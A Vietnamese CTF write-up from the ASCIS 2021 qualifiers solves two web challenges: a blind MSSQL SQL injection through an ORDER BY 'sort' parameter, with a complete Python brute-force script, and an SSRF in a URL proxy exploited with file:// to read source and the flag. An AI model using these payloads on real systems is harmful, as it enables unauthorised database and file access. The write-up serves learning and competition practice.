# ============= ASCIS 2021 - Quals =============  
<hr />  
  
## script kiddie - 100pts  
  
Như mô tả ta có thể biết rằng web có chứa lỗ hổng SQL-injection với cơ sở dữ liệu được dùng ở đây là MSSQL.  
Câu query như sau: ` SELECT * FROM ... ORDER BY $sort ASC`  
Giá trị của biến `$sort` ta có thể control thông qua param `?sort=`  
Payload: `(case when (ascii(substring(db_name(),{index},1))={ord(c)}) then 1 else 1/db_name() end )`  
  
```python3  
import requests
from string import printable


url = 'http://167.172.85.253/web100/'
r = requests.Session()
db = ''
index = len(db) + 1

while True:
	for c in printable:
		#print("testing for " + c)
		payload = f'(case when (ascii(substring(db_name(),{index},1))={ord(c)}) then 1 else 1/db_name() end)'
		resp = r.get(url + '?sort=' + payload)
		if "Error" not in resp.text:
			db += c
			index += 1
			print(f"Length: {len(db)} - DB_NAME: {db}")
			break  
```  
![image](https://user-images.githubusercontent.com/44127534/137701975-53123d34-8aa2-4aa5-a045-d4bb27ac934d.png)  
> Flag: `ASICS{ssalchtiwesmihcueymorf}`  

## OProxy - 400pts
  
Challege là một trang web có chức năng cho người dùng nhập vào một url và server trả về nội dung của trang web đó.  
![1](https://user-images.githubusercontent.com/44127534/137702153-809ef500-a4e6-49fa-b83e-4df111c5c777.png)
  
Dự đoán đây có thể tác giả ra thử thách ssrf. Fuzz các payload ssrf thì thấy được:  
![2](https://user-images.githubusercontent.com/44127534/137702202-a82f0e56-e27d-4629-a829-de987f526274.png)
  
Để ý server respose header Werkzeug/1.01 Python/3.10.0, có thể dự đoán được back-end có thể là flask, và có thể challenge được dựng trên docker, thử nhập url: file://127.0.0.1/app/main.py thì có được mã nguồn:  
  
![3](https://user-images.githubusercontent.com/44127534/137702301-c120d7c0-0606-44ab-8ab1-590538b0dd33.png)
  
Tới đây thì thử đọc file flag:  
![4](https://user-images.githubusercontent.com/44127534/137702338-414b7486-4fa5-4cf3-8864-4121a2d92ccc.png)
  
> Flag: `ASCIS{SSRF_M3mcached_inj3cti0n}`  
